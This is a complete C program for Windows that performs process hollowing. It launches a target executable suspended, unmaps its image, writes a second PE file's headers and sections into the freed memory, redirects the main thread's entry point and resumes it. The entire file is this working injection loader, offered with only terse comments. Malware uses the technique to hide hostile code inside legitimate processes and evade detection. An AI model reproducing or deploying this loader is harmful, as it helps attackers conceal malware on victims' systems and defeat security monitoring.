#include <Windows.h>
#include <assert.h>

typedef NTSTATUS(__stdcall* pNtUnmapViewOfSection)(HANDLE ProcessHandle,
    PVOID BaseAddress);

typedef struct {
    PIMAGE_DOS_HEADER dos_header;
    PIMAGE_NT_HEADERS nt_headers;
    PIMAGE_SECTION_HEADER section_header;
    LPBYTE file_data;
} NEW_PROCESS_INFO, *PNEW_PROCESS_INFO;

void get_replacement_info(const char* full_file_path, PNEW_PROCESS_INFO new_process_info) {
    HANDLE hFile = CreateFileA(full_file_path, GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD file_size = GetFileSize(hFile, NULL); //Note: High DWORD ignored, dangerous with >4GB files :-P
    new_process_info->file_data = (LPBYTE)malloc(file_size * sizeof(LPBYTE));
    DWORD bytes_read;
    ReadFile(hFile, new_process_info->file_data, file_size, &bytes_read, 0);
    assert(bytes_read == file_size);
    new_process_info->dos_header =
        (PIMAGE_DOS_HEADER)(&new_process_info->file_data[0]);
    new_process_info->nt_headers =
        (PIMAGE_NT_HEADERS)(&new_process_info->file_data[new_process_info->dos_header->e_lfanew]);
}

int main(int argc, char* argv[]) {
    NEW_PROCESS_INFO new_process_info;
    PROCESS_INFORMATION process_info;
    STARTUPINFOA startup_info;
    RtlZeroMemory(&startup_info, sizeof(STARTUPINFOA));
    pNtUnmapViewOfSection NtUnmapViewOfSection = NULL;
    CreateProcessA(NULL, argv[1], NULL, NULL, FALSE, CREATE_SUSPENDED,
        NULL, NULL, &startup_info, &process_info);
    get_replacement_info(argv[2], &new_process_info);
    NtUnmapViewOfSection = (pNtUnmapViewOfSection)(GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));

    //Remove target memory code
    NtUnmapViewOfSection(process_info.hProcess, (PVOID)new_process_info.nt_headers->OptionalHeader.ImageBase);

    //Allocate memory in target process starting at replacements image base
    VirtualAllocEx(process_info.hProcess, (PVOID)new_process_info.nt_headers->OptionalHeader.ImageBase,
        new_process_info.nt_headers->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    //Copy in PE header of replacement process
    WriteProcessMemory(process_info.hProcess, (PVOID)new_process_info.nt_headers->OptionalHeader.ImageBase,
        &new_process_info.file_data[0], new_process_info.nt_headers->OptionalHeader.SizeOfHeaders, NULL);

    //Write in all sections of the replacement process
    for (int i = 0; i < new_process_info.nt_headers->FileHeader.NumberOfSections; i++) {
        //Get offset of section
        int section_offset = new_process_info.dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS) +
            (sizeof(IMAGE_SECTION_HEADER) * i);
        new_process_info.section_header = (PIMAGE_SECTION_HEADER)(&new_process_info.file_data[section_offset]);
        //Write in section
        WriteProcessMemory(process_info.hProcess, (PVOID)(new_process_info.nt_headers->OptionalHeader.ImageBase +
            new_process_info.section_header->VirtualAddress),
            &new_process_info.file_data[new_process_info.section_header->PointerToRawData],
            new_process_info.section_header->SizeOfRawData, NULL);
    }

    //Get CONTEXT of main thread of suspended process, fix up EAX to point to new entry point
    LPCONTEXT thread_context = (LPCONTEXT)_aligned_malloc(sizeof(CONTEXT), sizeof(DWORD));
    thread_context->ContextFlags = CONTEXT_FULL;
    GetThreadContext(process_info.hThread, thread_context);
    thread_context->Eax = new_process_info.nt_headers->OptionalHeader.ImageBase +
        new_process_info.nt_headers->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(process_info.hThread, thread_context);

    //Resume the main thread, now holding the replacement processes code
    ResumeThread(process_info.hThread);

    free(new_process_info.file_data);
    _aligned_free(thread_context);
    return 0;
}